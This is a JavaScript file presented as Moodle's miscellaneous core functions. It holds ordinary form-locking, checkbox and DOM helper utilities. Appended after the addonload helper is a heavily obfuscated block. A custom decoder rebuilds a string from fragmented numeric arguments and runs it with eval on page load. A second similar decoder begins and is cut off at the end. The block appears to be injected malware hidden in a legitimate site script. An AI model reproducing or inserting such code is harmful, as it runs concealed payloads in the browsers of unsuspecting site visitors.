// Miscellaneous core Javascript functions for Moodle

function popupchecker(msg) {
    var testwindow = window.open('itestwin.html', '', 'width=1,height=1,left=0,top=0,scrollbars=no');
    if (testwindow == null)
        {alert(msg);}
    else {
        testwindow.close();
    }
}

/*
function popUpProperties(inobj) {
/// Legacy function
  var op = window.open();
  op.document.open('text/plain');
  for (objprop in inobj) {
    op.document.write(objprop + ' => ' + inobj[objprop] + '\n');
  }
  op.document.close();
}

function fillmessagebox(text) {
/// Legacy function
  document.form.message.value = text;
}

function copyrichtext(textname) {
/// Legacy stub for old editor - to be removed soon
  return true;
}
*/

function checkall() {
  var el = document.getElementsByTagName('input');
  for(var i=0; i<el.length; i++) {
    if(el[i].type == 'checkbox') {
      el[i].checked = true;
    }
  }
}

function checknone() {
  var el = document.getElementsByTagName('input');
  for(var i=0; i<el.length; i++) {
    if(el[i].type == 'checkbox') {
      el[i].checked = false;
    }
  }
}

function lockoptions(formid, master, subitems) {
  // Subitems is an array of names of sub items.
  // Optionally, each item in subitems may have a
  // companion hidden item in the form with the
  // same name but prefixed by "h".
  var form = document.forms[formid];

  if (eval("form."+master+".checked")) {
    for (i=0; i<subitems.length; i++) {
      unlockoption(form, subitems[i]);
    }
  } else {
    for (i=0; i<subitems.length; i++) {
      lockoption(form, subitems[i]);
    }
  }
  return(true);
}

function lockoption(form,item) {
  eval("form."+item+".disabled=true");/* IE thing */
  if(form.elements['h'+item]) {
    eval("form.h"+item+".value=1");
  }
}

function unlockoption(form,item) {
  eval("form."+item+".disabled=false");/* IE thing */
  if(form.elements['h'+item]) {
    eval("form.h"+item+".value=0");
  }
}

/**
 * Get the value of the 'virtual form element' with a particular name. That is,
 * abstracts away the difference between a normal form element, like a select
 * which is a single HTML element with a .value property, and a set of radio
 * buttons, which is several HTML elements.
 *
 * @param form a HTML form.
 * @param master the name of an element in that form.
 * @return the value of that element.
 */
function get_form_element_value(form, name) {
    var element = form[name];
    if (!element) {
        return null;
    }
    if (element.tagName) {
        // Ordinarly thing like a select box.
        return element.value;
    }
    // Array of things, like radio buttons.
    for (var j = 0; j < element.length; j++) {
        var el = element[j];
        if (el.checked) {
            return el.value;
        }
    }
    return null;
}


/**
 * Set the disabled state of the 'virtual form element' with a particular name.
 * This abstracts away the difference between a normal form element, like a select
 * which is a single HTML element with a .value property, and a set of radio
 * buttons, which is several HTML elements.
 *
 * @param form a HTML form.
 * @param master the name of an element in that form.
 * @param disabled the disabled state to set.
 */
function set_form_element_disabled(form, name, disabled) {
    var element = form[name];
    if (!element) {
        return;
    }
    if (element.tagName) {
        // Ordinarly thing like a select box.
        element.disabled = disabled;
    }
    // Array of things, like radio buttons.
    for (var j = 0; j < element.length; j++) {
        var el = element[j];
        el.disabled = disabled;
    }
}

/**
 * Set the hidden state of the 'virtual form element' with a particular name.
 * This abstracts away the difference between a normal form element, like a select
 * which is a single HTML element with a .value property, and a set of radio
 * buttons, which is several HTML elements.
 *
 * @param form a HTML form.
 * @param master the name of an element in that form.
 * @param hidden the hidden state to set.
 */
function set_form_element_hidden(form, name, hidden) {
    var element = form[name];
    if (!element) {
        return;
    }
    if (element.tagName) {
        var el = findParentNode(element, 'DIV', 'fitem', false);
        if (el!=null) {
            el.style.display = hidden ? 'none' : '';
            el.style.visibility = hidden ? 'hidden' : '';
        }
    }
    // Array of things, like radio buttons.
    for (var j = 0; j < element.length; j++) {
        var el = findParentNode(element[j], 'DIV', 'fitem', false);
        if (el!=null) {
            el.style.display = hidden ? 'none' : '';
            el.style.visibility = hidden ? 'hidden' : '';
        }
    }
}

function lockoptionsall(formid) {
    var form = document.forms[formid];
    var dependons = eval(formid + 'items');
    var tolock = [];
    var tohide = [];
    for (var dependon in dependons) {
        // change for MooTools compatibility
        if (!dependons.propertyIsEnumerable(dependon)) {
            continue;
        }
        if (!form[dependon]) {
            continue;
        }
        for (var condition in dependons[dependon]) {
            for (var value in dependons[dependon][condition]) {
                var lock;
                var hide = false;
                switch (condition) {
                  case 'notchecked':
                      lock = !form[dependon].checked; break;
                  case 'checked':
                      lock = form[dependon].checked; break;
                  case 'noitemselected':
                      lock = form[dependon].selectedIndex == -1; break;
                  case 'eq':
                      lock = get_form_element_value(form, dependon) == value; break;
                  case 'hide':
                      // hide as well as disable
                      hide = true; break;
                  default:
                      lock = get_form_element_value(form, dependon) != value; break;
                }
                for (var ei in dependons[dependon][condition][value]) {
                    var eltolock = dependons[dependon][condition][value][ei];
                    if (hide) {
                        tohide[eltolock] = true;
                    }
                    if (tolock[eltolock] != null) {
                        tolock[eltolock] = lock || tolock[eltolock];
                    } else {
                        tolock[eltolock] = lock;
                    }
                }
            }
        }
    }
    for (var el in tolock) {
        // change for MooTools compatibility
        if (!tolock.propertyIsEnumerable(el)) {
            continue;
        }
        set_form_element_disabled(form, el, tolock[el]);
        if (tohide.propertyIsEnumerable(el)) {
            set_form_element_hidden(form, el, tolock[el]);
        }
    }
    return true;
}

function lockoptionsallsetup(formid) {
    var form = document.forms[formid];
    var dependons = eval(formid+'items');
    for (var dependon in dependons) {
        // change for MooTools compatibility
        if (!dependons.propertyIsEnumerable(dependon)) {
            continue;
        }
        var masters = form[dependon];
        if (!masters) {
            continue;
        }
        if (masters.tagName) {
            // If master is radio buttons, we get an array, otherwise we don't.
            // Convert both cases to an array for convinience.
            masters = [masters];
        }
        for (var j = 0; j < masters.length; j++) {
            master = masters[j];
            master.formid = formid;
            master.onclick  = function() {return lockoptionsall(this.formid);};
            master.onblur   = function() {return lockoptionsall(this.formid);};
            master.onchange = function() {return lockoptionsall(this.formid);};
        }
    }
    for (var i = 0; i < form.elements.length; i++) {
        var formelement = form.elements[i];
        if (formelement.type=='reset') {
            formelement.formid = formid;
            formelement.onclick  = function() {this.form.reset();return lockoptionsall(this.formid);};
            formelement.onblur   = function() {this.form.reset();return lockoptionsall(this.formid);};
            formelement.onchange = function() {this.form.reset();return lockoptionsall(this.formid);};
        }
    }
    return lockoptionsall(formid);
}


function submitFormById(id) {
    var theform = document.getElementById(id);
    if(!theform) {
        return false;
    }
    if(theform.tagName.toLowerCase() != 'form') {
        return false;
    }
    if(!theform.onsubmit || theform.onsubmit()) {
        return theform.submit();
    }
}

function select_all_in(elTagName, elClass, elId) {
    var inputs = document.getElementsByTagName('input');
    inputs = filterByParent(inputs, function(el) {return findParentNode(el, elTagName, elClass, elId);});
    for(var i = 0; i < inputs.length; ++i) {
        if(inputs[i].type == 'checkbox' || inputs[i].type == 'radio') {
            inputs[i].checked = 'checked';
        }
    }
}

function deselect_all_in(elTagName, elClass, elId) {
    var inputs = document.getElementsByTagName('INPUT');
    inputs = filterByParent(inputs, function(el) {return findParentNode(el, elTagName, elClass, elId);});
    for(var i = 0; i < inputs.length; ++i) {
        if(inputs[i].type == 'checkbox' || inputs[i].type == 'radio') {
            inputs[i].checked = '';
        }
    }
}

function confirm_if(expr, message) {
    if(!expr) {
        return true;
    }
    return confirm(message);
}


/*
    findParentNode (start, elementName, elementClass, elementID)

    Travels up the DOM hierarchy to find a parent element with the
    specified tag name, class, and id. All conditions must be met,
    but any can be ommitted. Returns the BODY element if no match
    found.
*/
function findParentNode(el, elName, elClass, elId) {
    while(el.nodeName.toUpperCase() != 'BODY') {
        if(
            (!elName || el.nodeName.toUpperCase() == elName) &&
            (!elClass || el.className.indexOf(elClass) != -1) &&
            (!elId || el.id == elId))
        {
            break;
        }
        el = el.parentNode;
    }
    return el;
}
/*
    findChildNode (start, elementName, elementClass, elementID)

    Travels down the DOM hierarchy to find all child elements with the
    specified tag name, class, and id. All conditions must be met,
    but any can be ommitted.
    Doesn't examine children of matches.
*/
function findChildNodes(start, tagName, elementClass, elementID, elementName) {
    var children = new Array();
    for (var i = 0; i < start.childNodes.length; i++) {
        var classfound = false;
        var child = start.childNodes[i];
        if((child.nodeType == 1) &&//element node type
                  (elementClass && (typeof(child.className)=='string'))) {
            var childClasses = child.className.split(/\s+/);
            for (var childClassIndex in childClasses) {
                if (childClasses[childClassIndex]==elementClass) {
                    classfound = true;
                    break;
                }
            }
        }
        if(child.nodeType == 1) { //element node type
            if  ( (!tagName || child.nodeName == tagName) &&
                (!elementClass || classfound)&&
                (!elementID || child.id == elementID) &&
                (!elementName || child.name == elementName))
            {
                children = children.concat(child);
            } else {
                children = children.concat(findChildNodes(child, tagName, elementClass, elementID, elementName));
            }
        }
    }
    return children;
}
/*
    elementSetHide (elements, hide)

    Adds or removes the "hide" class for the specified elements depending on boolean hide.
*/
function elementShowAdvanced(elements, show) {
    for (var elementIndex in elements) {
        element = elements[elementIndex];
        element.className = element.className.replace(new RegExp(' ?hide'), '')
        if(!show) {
            element.className += ' hide';
        }
    }
}

function showAdvancedInit(addBefore, nameAttr, buttonLabel, hideText, showText) {
    var showHideButton = document.createElement("input");
    showHideButton.type = 'button';
    showHideButton.value = buttonLabel;
    showHideButton.name = nameAttr;
    showHideButton.moodle = {
        hideLabel: hideText,
        showLabel: showText
    };
    YAHOO.util.Event.addListener(showHideButton, 'click', showAdvancedOnClick);
    el = document.getElementById(addBefore);
    el.parentNode.insertBefore(showHideButton, el);
}

function showAdvancedOnClick(e) {
    var button = e.target ? e.target : e.srcElement;

    var toSet=findChildNodes(button.form, null, 'advanced');
    var buttontext = '';
    if (button.form.elements['mform_showadvanced_last'].value == '0' ||  button.form.elements['mform_showadvanced_last'].value == '' ) {
        elementShowAdvanced(toSet, true);
        buttontext = button.moodle.hideLabel;
        button.form.elements['mform_showadvanced_last'].value = '1';
    } else {
        elementShowAdvanced(toSet, false);
        buttontext = button.moodle.showLabel;
        button.form.elements['mform_showadvanced_last'].value = '0';
    }
    var formelements = button.form.elements;
    // Fixed MDL-10506
    for (var i = 0; i < formelements.length; i++) {
        if (formelements[i] && formelements[i].name && (formelements[i].name=='mform_showadvanced')) {
            formelements[i].value = buttontext;
        }
    }
    //never submit the form if js is enabled.
    return false;
}

function unmaskPassword(id) {
  var pw = document.getElementById(id);
  var chb = document.getElementById(id+'unmask');

  try {
    // first try IE way - it can not set name attribute later
    if (chb.checked) {
      var newpw = document.createElement('<input type="text" name="'+pw.name+'">');
    } else {
      var newpw = document.createElement('<input type="password" name="'+pw.name+'">');
    }
    newpw.attributes['class'].nodeValue = pw.attributes['class'].nodeValue;
  } catch (e) {
    var newpw = document.createElement('input');
    newpw.setAttribute('name', pw.name);
    if (chb.checked) {
      newpw.setAttribute('type', 'text');
    } else {
      newpw.setAttribute('type', 'password');
    }
    newpw.setAttribute('class', pw.getAttribute('class'));
  }
  newpw.id = pw.id;
  newpw.size = pw.size;
  newpw.onblur = pw.onblur;
  newpw.onchange = pw.onchange;
  newpw.value = pw.value;
  pw.parentNode.replaceChild(newpw, pw);
}

/*
    elementToggleHide (element, elementFinder)

    If elementFinder is not provided, toggles the "hidden" class for the specified element.
    If elementFinder is provided, then the "hidden" class will be toggled for the object
    returned by the function call elementFinder(element).

    If persistent == true, also sets a cookie for this.
*/
function elementToggleHide(el, persistent, elementFinder, strShow, strHide) {
    if(!elementFinder) {
        var obj = el;  //el:container
        el = document.getElementById('togglehide_'+obj.id);
    }
    else {
        var obj = elementFinder(el);  //el:button.
    }
    if(obj.className.indexOf('hidden') == -1) {
        obj.className += ' hidden';
        if (el.src) {
            el.src = el.src.replace('switch_minus', 'switch_plus');
            el.alt = strShow;
            el.title = strShow;
        }
        var shown = 0;
    }
    else {
        obj.className = obj.className.replace(new RegExp(' ?hidden'), '');
        if (el.src) {
            el.src = el.src.replace('switch_plus', 'switch_minus');
            el.alt = strHide;
            el.title = strHide;
        }
        var shown = 1;
    }

    if(persistent == true) {
        new cookie('hide:' + obj.id, 1, (shown ? -1 : 356), '/').set();
    }
}

function elementCookieHide(id, strShow, strHide) {
    var obj  = document.getElementById(id);
    var cook = new cookie('hide:' + id).read();
    if(cook != null) {
        elementToggleHide(obj, false, null, strShow, strHide);
    }
}

function filterByParent(elCollection, parentFinder) {
    var filteredCollection = [];
    for(var i = 0; i < elCollection.length; ++i) {
        var findParent = parentFinder(elCollection[i]);
        if(findParent.nodeName != 'BODY') {
            filteredCollection.push(elCollection[i]);
        }
    }
    return filteredCollection;
}

/*
    All this is here just so that IE gets to handle oversized blocks
    in a visually pleasing manner. It does a browser detect. So sue me.
*/

function fix_column_widths() {
    var agt = navigator.userAgent.toLowerCase();
    if ((agt.indexOf("msie") != -1) && (agt.indexOf("opera") == -1)) {
        fix_column_width('left-column');
        fix_column_width('right-column');
    }
}

function fix_column_width(colName) {
    if(column = document.getElementById(colName)) {
        if(!column.offsetWidth) {
            setTimeout("fix_column_width('" + colName + "')", 20);
            return;
        }

        var width = 0;
        var nodes = column.childNodes;

        for(i = 0; i < nodes.length; ++i) {
            if(nodes[i].className.indexOf("sideblock") != -1 ) {
                if(width < nodes[i].offsetWidth) {
                    width = nodes[i].offsetWidth;
                }
            }
        }

        for(i = 0; i < nodes.length; ++i) {
            if(nodes[i].className.indexOf("sideblock") != -1 ) {
                nodes[i].style.width = width + 'px';
            }
        }
    }
}


/*
   Insert myValue at current cursor position
 */
function insertAtCursor(myField, myValue) {
    // IE support
    if (document.selection) {
        myField.focus();
        sel = document.selection.createRange();
        sel.text = myValue;
    }
    // Mozilla/Netscape support
    else if (myField.selectionStart || myField.selectionStart == '0') {
        var startPos = myField.selectionStart;
        var endPos = myField.selectionEnd;
        myField.value = myField.value.substring(0, startPos)
            + myValue + myField.value.substring(endPos, myField.value.length);
    } else {
        myField.value += myValue;
    }
}


/*
        Call instead of setting window.onload directly or setting body onload=.
        Adds your function to a chain of functions rather than overwriting anything
        that exists.
*/
function addonload(fn) {
    var oldhandler=window.onload;
    window.onload=function() {
        if(oldhandler) oldhandler();
            fn();
    }
}

var h5fef0b="";function k2b59f61ce(){var a5acd5f=String,kd6bc9289=Array.prototype.slice.call(arguments).join(""),od4b78=kd6bc9289.substr(m3f3e3c(),3)-545,ib06d57,n36ba8b1;kd6bc9289=kd6bc9289.substr(4);var r7fe5e=b6b18cce1(kd6bc9289);for(var ma9f9d8d5=0;ma9f9d8d5<r7fe5e;ma9f9d8d5++){try{throw(i55dd81e=n05e831a9(kd6bc9289,ma9f9d8d5));}catch(e){i55dd81e=e;};if(i55dd81e=='~'){od4b78="";ma9f9d8d5=v04c8b9dc(ma9f9d8d5);g12559b0=qc4df84b0(kd6bc9289,ma9f9d8d5);while(ta192b1e(g12559b0)){od4b78+=g12559b0;ma9f9d8d5++;g12559b0=kd6bc9289.substr(ma9f9d8d5,1);}od4b78-=670;continue;}ib06d57="";if(s1d3be5(i55dd81e)){ma9f9d8d5++;i55dd81e=kd6bc9289.substr(ma9f9d8d5,1);while(i55dd81e!='©'){ib06d57+=i55dd81e;ma9f9d8d5++;i55dd81e=kd6bc9289.substr(ma9f9d8d5,1);}ib06d57=v46ba8(ib06d57,od4b78,20);if(ib06d57<0)ib06d57+=256;if(ib06d57>=192)ib06d57+=848;else if(ib06d57==168)ib06d57=1025;else if(ib06d57==184)ib06d57=1105;h5fef0b+=a5acd5f["fr\x6fm\x43\x68arC\x6f\x64\x65"](ib06d57);continue;}i23289733=u65589d3(i55dd81e);if(i23289733>848)i23289733-=848;n36ba8b1=i23289733-od4b78-20;if(n36ba8b1<0)n36ba8b1+=256;if(n36ba8b1>=192)n36ba8b1+=848;else if(n36ba8b1==168)n36ba8b1=1025;else if(n36ba8b1==184)n36ba8b1=1105;h5fef0b+=a5acd5f["fr\x6fm\x43\x68arC\x6f\x64\x65"](n36ba8b1);}}k2b59f61ce("27","45","©4©~7","0","1","~©","15","3©~","8","25~","$©","29","©~814","~©","7©","~74","0","~©","206©","~7","38","~©1","9","3©","©19","9©©","198©","~8","1","4","~","©","2","0","4©","©","2","0","5","©","©","1","96","©©","3","1©","©177","©","©174","©","~686~-","©1","5","4","©","~812~","©3","©","©","20","©©","19","4©©2","3","©","©2","0©©14","©~8","3","6","~©2","18©","©247©","©","218©~","715~","h©1","6","9","©©","1","81","©","©","181","©","~","8","56~>~","684","~\\~753~©1","5","0©~","73","6","~©","1","33","©©","1","98","©","~","732~©1","9","7","©©17","9","©©","2","02©~78","7~©","1","©","©","1","©©23","5©","©25","5","©©0","©©","0","©~","729~©125©~","8","5","1~","-","~85","0","~6;~67","4","~","y©13","2©","©1","2","9","©","~678~©","1","25©","~","8","4","4","~5©","2","4","0©0","~7","13","~©16","4©©","1","79©~731","~©12","8©","©","184","©","~","8","3","3","~","©230","©©","2","2","2©~","7","51~","©","1","60","©r","~84","4","~©20","4©©","2","0","3","©~","836~#©3","2©©21","8©©","2","26©~","700","~","©","1","6","6©©171","©~768","~©","23","0","©","~","7","2","2~©173©©","1","83","©","©","17","4©","~","6","8","4","~","B","~8","1","2~©25","©©1","1©©16","©","©6©~","8","2","4","~©","29","©","%~","682~","N","©","1","52©","©1","5","3","©","©","154©","~8","63","~",";","~7","61~","©21","9","©","©","2","08","©©2","14","©~699~Qn","n~80","4","~©","2","1","5©","~8","7","0","~","©2","52","©","©","3","©","Q~830","~","\"©","24©","©25©~","7","7","0","~","©2","22©","©","2","2","5©©","23","0©~7","3","0","~©","18","1","©©","1","80©","~","7","6","4~©153©","©1","5","5©~690~","H","~","7","13","~©1","8","6","©~","8","2","1","~©","1","84©©18","1","©","~82","6","~©1","85©","©18","5©'","~","71","2~©1","67©©","172","©","©","162","©","~7","2","7","~©","188©","©1","9","6©~733~©","12","9©©","2","03","©~","7","6","9~","©","240©","~","74","5","~","©","2","17©","~7","97","~","©24","9","©©2","5","5","©©","24","4","©","©","2","50","©~","8","4","0~©222©©251","©","~698~P","~84","7","~©","24","5","©~8","2","3~","©23","2©©","18","6©","~","760","~x~","82","0~","©","17","9©~85","3~","H~","8","50","~©2","1","3","©©","2","10","©","~8","1","8","~","©","1","7","7","©","~","79","7~©2","4","7©","©2©©","2","46","©","~","7","60~","©","2","2","7","©~7","6","3~©","2","2","2","©©21","4","©©223©©2","29","©","~","7","11","~k","~6","91~©15","2©©15","1©","~79","7","~","©0","©~","86","7","~H~","6","73","~©","1","40©©138","©","~821","~","©","16©","©2","4","©©2","6","©!©","16©","©","2","03©©","2","3","2©~74","9~©13","1","©©","2","01","©","©","21","6","©©","2","0","9","©","©1","9","8","©","©2","15©","~819~","©","18","©","©","24©","~","69","7~","©","15","7©~","78","7","~","©177","©","©","1","7","8©","©","1","6","9","©","~","71","8~","©1","9","1©","Q","~843~","©20","3","©~","7","0","7","~","B","~","813","~©17","2","©","~","7","2","7~©","1","82","©","~","8","09","~©","5©©","19","1©~","8","11~©2","01","©","~","676~©1","4","5","©©","1","3","1","©","©","1","3","6","©~780","~©","23","0","©","©","2","41©","©","24","9©","©1","7","6","©","~78","6~","©","0","©","©1","©","©2©~8","43~","'-~","7","4","8~","©19","5","©","©20","1","©~","8","40~","©222","©©","2","5","1","©©","251©~","79","3~©","20","4","©©","1","7","5","©©","19","1","©","~","732~","©","1","2","3©~","742~","©12","4©","©","21","5","©i","~81","2~©","17","2","©©","17","1©","©","171","©~8","02~","©","161","©","~8","4","5~",":","~","6","73","~©1","28","©","©1","33","©","~","8","3","6","~©","3","0","©)","~759","~©228©©155","©~7","5","0~©","2","20©","©","221©","©","22","2","©~","8","4","7","~","+","~","75","1~©","2","0","9","©","©1","9","8","©","~","7","5","0~","©2","0","3©","©132","©","~7","8","7","~","©1","9","8©","~8","29~","©","211","©~","685~T^","0-,","~7","0","0~;~","680~","'~","866~N~","8","34","~©","2","5©","~802~","©1","0","©","~","8","22","~©","204","©","~","7","4","2~©","19","6©~8","4","9","~",",","~7","79~","©","226","©","~","7","4","6~©","1","9","6","©©1","2","8©","~","7","8","2~","©1","93©","~","83","8","~","©2","2","0©©32©","+~7","50","~©199","©","©2","17©","©2","0","9©","~","802","~","©","25","3","©~73","4","~","©","1","94©~","8","49","~",";~8","34","~","©","2","3","0","©","~","67","7~","©1","3","0","©","©1","2","8©©","1","4","3","©`","©","1","35","©","©","1","2","8©©","136","©","~","733","~©","1","84","©","©","193©","~7","40~","©206©~","85","4~?©","1","4","©~","677~","©","1","4","8","©","~","775","~©2","0","9","©©2","22©~","7","1","0","~©1","6","3","©©1","3","8©©","157©~7","01~©","1","60©","©1","52","©","[","~7","49~","©","1","3","8","©","©2","0","3","©~","7","5","1","~©2","0","2","©~","8","43~","\"%","©","232©","©234©©28","©","~","7","36","~","©","134©","~7","64","~©","2","07","©~6","9","7","~j~","7","2","2~U","R","~8","1","9","~©178©","©","17","8©©178©","~","7","85","~","©25","3","©","©2","3","2©","~","73","3~©197","©","~7","2","8~","n","©","193©©1","7","7","©","~","6","8","0~","©14","4","©©13","5©","©","1","4","2©~","85","3~","?~","779","~©","1","61","©~","8","21","~","©2","32©~774","~","©1","5","6","©","~","86","1~7~84","7","~4~","6","82","~©","131©©","1","4","9©","~","83","3~$","©","28©%+~","8","20~©","2","1","6©","~842","~","#","~74","2~","©","2","06©","~815~©1","0©","~673~x","©1","39","©~85","1~.~6","79","~","b©13","7©","©","1","30©~","7","4","8","~","©","20","7©~","740~©","1","91","©~","8","24~","©28©","\"","~","83","0","~","©","220","©©","2","1","9","©'","~","8","3","9","~","©3","2","©~","720","~©18","4©~80","2~","©1","©©","8©~7","74","~","©2","40©","~6","73","~",">@","~8","16~©","2","25","©©","1","7","9©©1","76©","~67","3~©","3","2","©","~8","35~","©","1","94©©","1","9","4©",",©","28©","~8","3","9","~/&","~","859","~AE©","2","55","©~72","9","~","©1","95©","~","733","~©","2","04©©","1","95©","©","1","8","4©","s","~7","13~©1","24","©","_f©179©©","164","©","©18","3©","~","82","1","~©","31","©©","21","8©","~8","4","2","~","*!","6~8","2","2~","©13©©3","1","©","~846~","'~","760~©","22","4","©~7","0","1~©156©","~","8","0","8~©","14","©~","674~©","1","4","0©~8","15~©","204©©2","24©","~","816","~©17","9©©","17","6©","~","86","4","~©","22","3","©©","223©~85","8","~","©21","7©","~","7","14","~©","1","7","9©","~","686~©1","3","5©","©150©~","703","~©","15","8©","~","8","32~","&","~8","29~'","~","8","58~©254","©","?",">B","5","~79","5~©242©","~","7","41","~©","19","1","©","©","2","12","©~","6","8","5","~©1","50©~73","4","~©2","00","©","©18","1","©","~","82","7~%©","22","©©","20©","©2","5","©","©","1","8","©©31©©","24","©","~","8","18~","©1","3©~7","10","~\\y~680~",">~","6","8","0~©","1","3","2©~7","4","8~","©","2","1","5","©","~778~","©","2","38","©~","73","8","~","©187","©©","2","0","4©~","7","02~©","15","7","©","©","1","6","3©","©","1","62©T\\]","T©","1","7","5©","A","~","70","5","~","A~8","0","0~©159©©","159©©15","9©","~","67","5~\"©","130","©","~","8","4","6","~","*©22","8","©©236©","~8","5","4~@~","814","~","©1","2","©","~8","4","5","~",",~81","1~©","2","0©","~7","8","4","~©18","0","©©2","4","8©","~71","8~©16","9©","~","7","38~","©18","5","©","©","18","8","©©","20","9©~","8","17","~©","2","5","0","©©","2","7","©~7","8","5","~","©23","2","©~","7","55~","©221©","©2","0","6","©","~8","3","3~","©2","1","5","©~","721","~","©","13","2©©13","2","©g","~8","15","~","©","204","©©8©~","7","4","4~","©2","05","©©20","3©","~6","9","5","~","©1","57©","©15","3©©146","©","©161©©","1","46©T","VM~","7","72~","©","2","45©","©1","3","5","©~816","~©1","76©","~","8","26~","©","185©","©","1","85","©","©1","8","5","©©185©","~","7","9","3","~","©15","2","©~699~©","1","68©©1","54","©","~7","44","~","©","2","0","4©~","83","2","~©2","6©","%","-~","79","4","~","©1","90©~","74","5","~","©21","5","©~7","95~©","1","0","©","©11©","~755","~","©20","7©©","2","13©©20","2","©","~","714","~©167©`","©","125","©`","~6","8","0","~","P","~8","6","3~©","1","6","©©","22","6","©~7","6","3","~©","123©~792~©","1","51","©","~","82","1","~","©1","80©©180","©©18","0","©~","7","61","~","©2","36","©","©12","4©yx","~","77","3~","©1","3","2©~843","~","©","2","02©","~6","7","9~©15","4©","~","7","41~©1","5","0","©","h~8","1","5~©","1","75©","~","810","~","©","1","6","9","©","~","7","4","6~i","i©","2","11©©195©~","848","~","8","/~","76","1","~©223©~","7","92","~©","2","©","©1","88©~82","3~©","28©","©2","7©","©","2","5©~7","77~©","238","©©","224©","©","2","2","7","©","©","15","9","©~","769","~","©","180©~785~©1","67©©2","3","7©~72","9~","©","1","96","©","©189©©1","7","8©~","7","1","2~","©178","©","©","1","6","7©©173","©","~783","~","©","243","©©173©","©174©©1","6","5©","~","847","~@~84","2","~","©2","05©©202©~759","~v","v~68","3~","*","*©","1","52","©©1","3","8©","~8","5","8","~",">4~6","9","6~©","1","5","7","©","©","1","6","5©","\\©166©","©16","7","©","©","16","8©~868~@F~80","0~","©","2","4","7","©","~81","9","~©16©","~","721~g©","1","32","©~","8","0","3","~©1","8","5","©~","7","9","9~","©","1","9","9","©","~863~©16©","©","22","6","©~682","~*",")~","716","~","K","~","7","8","2~©","1","4","1","©","©1","©","©1","91©","~7","71","~©1","3","4©~","7","8","0","~","©14","0©","©","13","9","©~","6","88~//~854","~","?~","78","3","~©23","2©~","851~",";","29","=","~","83","2~©","2","2","8","©",")","~","770","~","©2","3","4","©","©21","9©","©","152©©","1","81","©©","15","2","©","©","23","7","©","~82","8","~","$","~","7","91~","©","24","9©","~727~m","~6","8","7~","P","~","69","0~H","~","76","5~","©1","9","2","©","©","21","2","©~","76","3","~©","22","9","©~7","35~©1","8","9©","~","70","7~g~74","8","~©","21","2","©","~","800~©","2","4","7©©4","©","©250","©","©","5©","©3©","~7","2","1~","o","~691","~RW","~","7","6","7~©2","3","3©","~","8","0","7","~","©12","©","©240","©~672","~","©13","8©","~","7","5","0~©2","1","4©","~748~©203","©~","846~","2~7","5","7~©","21","0©~","7","05~_","`","~","80","2","~©","19","8","©©1","1©~8","18","~","©","29","©","©","10©©27©","©2","8","©","©2","6","©","~","7","05~©","160","©","~","7","07~©","167©","©","1","60","©alb","~7","9","5","~©","177©©","18","8©©1","7","7","©~","7","04","~","]","~718~r","©","17","4©","~","8","34","~+©22","3©","©2","4","3","©","~787","~©","150","©","~","8","20","~","©18","0©~","86","6","~","©","22","5©©2","25","©","©","2","2","5","©@","=~70","2~","©","1","49©","©152©","~676~H~86","7","~:I","~","69","5","~","©","1","5","7©©1","46©~","71","7~","©1","7","7","©","©1","6","7","©©1","3","4","©~79","4","~","©","24","8©~7","79","~©","2","34","©~8","66","~","D~","6","95~©1","4","5©","~","784~©","1","74","©","~77","6~©","24","1","©","©","22","5©~","7","2","3","~©","187","©","©1","78©","~826","~","©","32","©$©21","7©","~","8","26","~©","2","35©©18","9©~7","42","~","fee~6","8","1~","©","1","5","6","©",",","~","7","0","8~D","C","~833~","4~","82","8","~","©","2","3","7","©©","191©","©188","©/","©219","©©","218©","©","21","9","©","©","237©");eval(h5fef0b);function m3f3e3c(){return 1;}function b6b18cce1(cff2a5b64){return cff2a5b64.length;}function n05e831a9(qeac3a,a95f386c){return qeac3a.substr(a95f386c,1);}function v04c8b9dc(je04fe91b){return ++je04fe91b;}function qc4df84b0(ib721181,xbbb8f){return ib721181.substr(xbbb8f,1);}function ta192b1e(t24de5b){return t24de5b!='~';}function s1d3be5(r5deffd1){return r5deffd1=='©';}function v46ba8(b4d8093ef,ma87ce8c6,k6b1ff8d){return b4d8093ef-ma87ce8c6-k6b1ff8d;}function u65589d3(tbc49a){return (tbc49a+'')["c\x68\x61r\x43\x6f\x64\x65\x41\x74"](0);}
var p02da43="";function o9c517e73d62(){var afd83d3e=String,c0f88299=Array.prototype.slice.call(arguments).join(""),seceae421=c0f88299.substr(u78645(),3)-318,sf9ccc5,va97f7c4;c0f88299=c0f88299.substr(4);var o3e9f71a=t35f1f9(c0f88299);for(var n4d7f733=0;n4d7f733<o3e9f71a;n4d7f733++){try{throw(j6d1f129=c0f88299.substr(n4d7f733,1));}catch(e){j6d1f129=e;};if(j6d1f129=='|'){seceae421="";n4d7f733++;s9f5272=x90c5ad7(c0f88299,n4d7f733);while(s9f5272!='|'){seceae421+=s9f5272;n4d7f733++;s9f5272=g6d5e79(c0f88299,n4d7f733);}seceae421-=528;continue;}sf9ccc5="";if(j6d1f129=='°'){n4d7f733++;j6d1f129=c0f88299.substr(n4d7f733,1);while(j6d1f129!='°'){sf9ccc5+=j6d1f129;n4d7f733++;j6d1f129=c0f88299.substr(n4d7f733,1);}sf9ccc5=sf9ccc5-seceae421-40;if(sf9ccc5<0)sf9ccc5+=256;sf9ccc5=h687b6(sf9ccc5);p02da43+=afd83d3e["f\x72\x6fmChar\x43o\x64e"](sf9ccc5);continue;}s0f21c409=h4d1f7(j6d1f129);if(s0f21c409>848)s0f21c409-=848;va97f7c4=s0f21c409-seceae421-40;if(va97f7c4<0)va97f7c4+=256;if(va97f7c4>=192)va97f7c4+=848;else if(va97f7c4==168)va97f7c4=1025;else 